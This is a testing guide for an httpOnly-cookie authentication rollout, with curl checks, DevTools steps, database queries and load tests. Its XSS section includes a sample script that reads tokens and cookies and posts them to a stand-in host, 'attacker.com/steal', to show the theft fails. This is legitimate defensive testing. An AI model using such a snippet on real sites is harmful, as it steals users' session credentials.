# Testing Guide - httpOnly Cookies Implementation

## Quick Verification Checklist

### ✅ Backend Verification

```bash
cd apps/api

# 1. Generate Prisma Client with new schema
npx prisma generate

# 2. Run migration
npx prisma migrate dev --name add_refresh_token_hash

# 3. Start API
npm run start:dev
```

**Test endpoints:**

```bash
# Test 1: Request magic link
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com"}'

# Expected output (development):
{
  "success": true,
  "message": "Si el email está registrado, recibirás un enlace de acceso",
  "magicLink": "http://localhost:3000/auth/verify?token=..."  # Solo en dev
}

# Test 2: Verify magic link (use token from step 1)
curl -X POST http://localhost:3001/api/auth/verify \
  -H "Content-Type: application/json" \
  -d '{"token":"YOUR_TOKEN_HERE"}' \
  -c cookies.txt \
  -v

# Expected output:
{
  "accessToken": "eyJhbGciOiJIUzI1NiIs...",
  "usuario": {
    "id": "...",
    "email": "test@example.com",
    "nombre": "Usuario",
    "apellido": "Pendiente"
  }
}

# Check cookies.txt for refreshToken
cat cookies.txt

# Test 3: Refresh token
curl -X POST http://localhost:3001/api/auth/refresh \
  -b cookies.txt \
  -c cookies_new.txt \
  -v

# Expected: New access token and new refresh token cookie

# Test 4: Access protected endpoint
curl -X GET http://localhost:3001/api/auth/me \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN"

# Expected: User data

# Test 5: Logout
curl -X POST http://localhost:3001/api/auth/logout \
  -b cookies.txt \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN" \
  -c cookies_after_logout.txt \
  -v

# Expected: Cookie cleared
```

### ✅ Frontend Verification (admin-web)

```bash
cd apps/admin-web
npm run dev
```

**Browser DevTools Checks:**

1. **Open DevTools** → Application tab

2. **Before Login:**
   - LocalStorage: Should NOT contain tokens
   - Cookies: Should NOT contain refreshToken

3. **After Login:**
   - LocalStorage: Should contain user data BUT NO tokens
   - Cookies: Should contain refreshToken with HttpOnly flag

4. **Check Console:**
```javascript
// Run in console - should all be null/undefined
localStorage.getItem('accessToken');        // null ✅
localStorage.getItem('refreshToken');       // null ✅
sessionStorage.getItem('accessToken');      // null ✅

// Cookie should NOT be accessible from JavaScript
document.cookie;                            // Doesn't show refreshToken ✅
```

5. **Test Auto-Refresh:**
   - Wait for 15 minutes (or modify JWT expiration for testing)
   - Make any API call
   - Should automatically refresh without 401 error

**Network Tab Verification:**

1. Login → `/api/auth/verify`
   - Status: 200
   - Response Headers: `Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict`

2. Any API call → `/api/expensas`
   - Request Headers: `Authorization: Bearer ...`

3. If token expires:
   - First call → 401
   - Auto-refresh → `/api/auth/refresh`
   - Retry original call → 200

### ✅ Security Verification

**Test 1: XSS Protection**

Create a test file with XSS attempt:

```html
<!-- xss-test.html -->
<html>
<body>
  <h1>XSS Test - Should NOT work</h1>
  <script>
    // Try to steal tokens
    const accessToken = localStorage.getItem('accessToken');
    const refreshToken = localStorage.getItem('refreshToken');
    const cookies = document.cookie;

    console.log(' accessToken:', accessToken);      // Should be null ✅
    console.log(' refreshToken:', refreshToken);    // Should be null ✅
    console.log('All cookies:', cookies);           // Should NOT show refreshToken ✅

    // Try to send to attacker server (should be empty)
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({ accessToken, refreshToken, cookies })
    });
  </script>
</body>
</html>
```

**Expected Result:** All variables are null/empty, attacker receives nothing.

**Test 2: CSRF Protection**

The `SameSite=strict` flag prevents CSRF attacks.

**Test 3: Cookie Security Flags**

In DevTools → Application → Cookies:

```
Name: refreshToken
Value: [long random string]
Domain: localhost
Path: /api/auth/refresh
Expires: Session / 7 days
HttpOnly: ✅ YES (cannot be accessed via JavaScript)
Secure: ✅ YES (in production)
SameSite: Strict
```

### ✅ Resident App Verification

```bash
cd apps/resident-app
npm run dev
```

**Verification:**
- AuthContext should be properly initialized
- No localStorage usage for tokens
- Cookie-based refresh works

### ✅ Staff App Verification

```bash
cd apps/staff-app
npm run dev
```

**Verification:**
- AuthContext initialized
- Sync-manager gets token from `__STAFF_ACCESS_TOKEN__`
- Offline mode still works

### ✅ Database Verification

```bash
# Connect to PostgreSQL
psql $DATABASE_URL

# Check new columns exist
\d usuarios

# Should show:
# refreshTokenHash     | text                      |
# refreshTokenExpires  | timestamp(3)             |

# Query to verify refresh tokens are stored as hashes
SELECT id, email, "refreshTokenHash" IS NOT NULL as has_refresh_token,
       "refreshTokenExpires" > NOW() as is_valid
FROM usuarios
WHERE "refreshTokenHash" IS NOT NULL;
```

## Performance Testing

### Test Concurrent Refresh Requests

```javascript
// Run in browser console
const requests = Array(10).fill(null).map(() =>
  fetch('/api/auth/refresh', { method: 'POST', credentials: 'include' })
);

Promise.all(requests).then(responses => {
  console.log('All requests completed');
  responses.forEach(r => console.log(r.status));
});
// Expected: All 200, only 1 actual refresh (mutex pattern)
```

### Test Token Expiry Handling

```javascript
// Manually expire token (for testing)
localStorage.setItem('test_token_expiry', Date.now() + 14 * 60 * 1000);

// Make API call after expiry
setTimeout(() => {
  fetch('/api/expensas', {
    headers: { Authorization: `Bearer ${expiredToken}` }
  });
}, 16 * 60 * 1000);

// Expected: Auto-refresh happens transparently
```

## Common Issues and Solutions

### Issue 1: Cookies not being set

**Symptoms:**
- No refreshToken in DevTools
- 401 on every request

**Solutions:**
1. Check API is running on correct domain/port
2. Verify `credentials: 'include'` in fetch calls
3. Check CORS allows credentials
4. Verify `SameSite` cookie attribute

### Issue 2: Token not refreshing automatically

**Symptoms:**
- 401 errors after 15 minutes
- User gets logged out

**Solutions:**
1. Verify `onTokenRefresh` callback is configured
2. Check endpoint is not `/api/auth/refresh` (would cause infinite loop)
3. Verify mutex pattern is working

### Issue 3: Logout not clearing cookies

**Symptoms:**
- User stays logged in after logout

**Solutions:**
1. Verify `/api/auth/logout` is being called
2. Check `path: '/api/auth/refresh'` matches cookie path
3. Verify response has `Set-Cookie: refreshToken=; Max-Age=0`

## Load Testing

```bash
# Install artillery
npm install -g artillery

# Create test script
cat > auth-load-test.yml << EOF
config:
  target: http://localhost:3001
  phases:
    - duration: 60
      arrivalRate: 10
scenarios:
  - flow:
      - post:
          url: /api/auth/login
          json:
            email: "test@example.com"
      - think: 2
      - post:
          url: /api/auth/verify
          json:
            token: "YOUR_TOKEN"
      - get:
          url: /api/auth/me
          headers:
            Authorization: "Bearer {{ accessToken }}"
EOF

# Run load test
artillery run auth-load-test.yml
```

## Acceptance Criteria

- ✅ No tokens in localStorage
- ✅ Cookies are httpOnly
- ✅ Refresh token stored as hash in database
- ✅ Auto-refresh works on 401
- ✅ Logout clears cookies
- ✅ User can refresh page and stay logged in (with valid refresh token)
- ✅ XSS cannot steal tokens
- ✅ CSRF protection with SameSite=strict
- ✅ Works in incognito mode
- ✅ Works across page reloads

## Sign-off

- [ ] Developer: Tests completed locally
- [ ] Security Review: Approved
- [ ] QA: All tests passed
- [ ] Product: User impact documented

---

**Last Updated:** 2026-02-06
